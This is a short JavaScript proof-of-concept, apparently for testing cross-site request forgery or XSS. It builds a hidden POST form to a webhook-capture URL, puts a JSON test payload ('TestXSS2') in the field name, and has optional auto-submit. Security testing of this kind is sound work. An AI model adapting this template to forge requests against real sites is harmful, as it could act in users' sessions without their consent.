(function(){
  const ACTION_URL = 'https://webhook-test.com/23dbd7f9f4b453a5720443d2ea9ef1b5';
  const AUTO_SUBMIT = false;

  const form = document.createElement('form');
  form.method = 'POST';
  form.action = ACTION_URL;

  const hidden = document.createElement('input');
  hidden.type = 'hidden';
  hidden.name = '{"text":"TestXSS2","mentions":[]}';
  hidden.value = '';
  form.appendChild(hidden);

  const submit = document.createElement('input');
  submit.type = 'submit';
  submit.value = 'Submit Request';
  form.appendChild(submit);

  document.body.appendChild(form);

  if (AUTO_SUBMIT) {
    setTimeout(()=> {
      try { form.submit(); console.log('Form submitted to', ACTION_URL); }
      catch (e) { console.error('Submit failed:', e); }
    }, 50);
  } else {
    console.log('Form created. ACTION:', ACTION_URL);
  }
})();

